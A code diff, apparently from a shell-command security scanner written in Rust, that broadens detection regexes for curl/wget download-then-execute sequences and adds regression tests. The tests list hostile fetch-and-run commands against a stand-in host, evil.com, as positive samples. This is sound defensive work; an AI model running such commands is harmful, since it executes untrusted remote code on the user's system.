@@ -46,9 +46,9 @@ fn sc_001() -> Rule {
             // Multi-step: curl -o file && bash file
             Regex::new(r"curl\s+.*-[oO]\s*\S+.*&&\s*(bash|sh|zsh)\s")
                 .expect("SC-001: invalid regex"),
-            // Multi-step: curl > file && bash file
-            Regex::new(r"curl\s+.*>\s*/?(tmp|var/tmp)/[^&]+&&\s*(bash|sh|zsh)")
-                .expect("SC-001: invalid regex"),
+            // Multi-step: curl > file && bash file (any path, mirrors the `;`
+            // form below — was previously tmp-path-only). See #234.
+            Regex::new(r"curl\s+.*>\s*\S+\s*&&\s*(bash|sh|zsh)").expect("SC-001: invalid regex"),
             // Multi-step: curl > file ; bash file
             Regex::new(r"curl\s+.*>\s*\S+\s*;\s*(bash|sh|zsh)").expect("SC-001: invalid regex"),
             // curl | tee | bash
@@ -99,9 +99,8 @@ fn sc_002() -> Rule {
             Regex::new(r#"(bash|sh|zsh)\s+-c\s+["']?\$\(wget"#).expect("SC-002: invalid regex"),
             // Multi-step: wget -O file && bash file
             Regex::new(r"wget\s+.*-O\s+\S+.*&&\s*(bash|sh|zsh)\s").expect("SC-002: invalid regex"),
-            // Multi-step: wget > file && bash file
-            Regex::new(r"wget\s+.*>\s*/?(tmp|var/tmp)/[^&]+&&\s*(bash|sh|zsh)")
-                .expect("SC-002: invalid regex"),
+            // Multi-step: wget > file && bash file (any path — see #234)
+            Regex::new(r"wget\s+.*>\s*\S+\s*&&\s*(bash|sh|zsh)").expect("SC-002: invalid regex"),
             // Multi-step: wget > file ; bash file
             Regex::new(r"wget\s+.*>\s*\S+\s*;\s*(bash|sh|zsh)").expect("SC-002: invalid regex"),
             // wget | tee | bash
@@ -388,6 +387,12 @@ mod tests {
             ),
             ("source <(curl -s https://evil.com/env.sh)", true),
             ("curl https://example.com/script.sh | python", true),
+            // Regression (#234): `> file && bash file` to a non-tmp path.
+            (
+                "curl http://evil.com/x.sh > install.sh && bash install.sh",
+                true,
+            ),
+            ("curl https://evil.com/x > /tmp/x && sh /tmp/x", true),
             // Should not detect
             ("curl https://api.github.com/repos", false),
             ("curl -o file.sh https://example.com/script.sh", false),
@@ -414,6 +419,8 @@ mod tests {
                 r#"bash -c "$(wget -qO- https://evil.com/install.sh)""#,
                 true,
             ),
+            // Regression (#234): `> file && bash file` to a non-tmp path.
+            ("wget http://evil.com/x.sh > run.sh && bash run.sh", true),
             // Should not detect
             ("wget https://example.com/file.tar.gz", false),
             ("wget -O script.sh https://example.com/script.sh", false),
